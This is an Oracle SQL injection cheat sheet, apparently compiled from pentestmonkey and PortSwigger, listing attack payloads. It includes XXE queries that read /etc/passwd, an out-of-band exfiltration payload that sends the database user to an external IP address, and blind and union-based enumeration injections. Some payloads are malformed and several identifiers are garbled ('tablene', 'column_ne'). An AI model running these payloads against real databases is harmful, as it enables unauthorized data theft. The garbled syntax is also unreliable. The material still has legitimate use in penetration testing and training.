SQLi - Oracle

# SQLi - Oracle

#### From:
- http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet
- http://ferruh.mavituna.com/oracle-sql-injection-cheat-sheet-oku/
- http://www.securitytube.net/video/6138
- https://portswigger.net/web-security/sql-injection/cheat-sheet
 
### Enumeration

 
Dumping
You can dump tables very similar to any other query language.
```
SELECT * FROM <tablene>
```
 
### Notes
1. There is no LIMIT clause in Oracle. If the database is Oracle 12c R1 or above, use instead `FETCH NEXT 10 ROWS ONLY`
e.g.
```
SELECT * FROM APP_HISTORY  FETCH NEXT 100 ROWS ONLY
```
 
### Local file access

```
select extractvalue(xmltype('<!ENTITY xxe SYSTEM "etc/passwd">]>'||'&'||'xxe;'),'/l') from dual;
select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "etc/passwd"> %remote; %param1;]>'),'/l') from dual;
```

### Data Exfiltration
https://blog.netspi.com/advisory-xxe-injection-oracle-database-cve-2014-6577/
https://exploitstube.com/sql-injection-abusing-xxe-in-oracle.html
```
select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://66.35.63.202/'||(SELECT user FROM dual)||'"> %remote; %param1;]>'),'/l') from dual;
```

### Pentestmonkey - Oracle SQLi
http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet
 
Some of the queries in the table below can only be run by an admin.  These are marked with “– priv” at the end of the query.


### Misc Tips
In no particular order, here are some suggestions from pentestmonkey readers.
From Christian Mehlmauer:
| Enumerate    | Command                 |
|--------------|-------------------------|
| Get all tablenes in one string | `select rtrim(xmlagg(xmlelement(e, table_ne || ‘,’)).extract(‘//text()’).extract(‘//text()’) ,’,') from all_tables` –  when using union based SQLI with only one row|
| Blind SQLI in order by clause	| `order by case when ((select 1 from user_tables where substr(lower(table_ne), 1, 1) = ‘a’ and rownum = 1)=1) then column_ne1 else column_ne2 end` — you must know 2 column nes with the same datatype|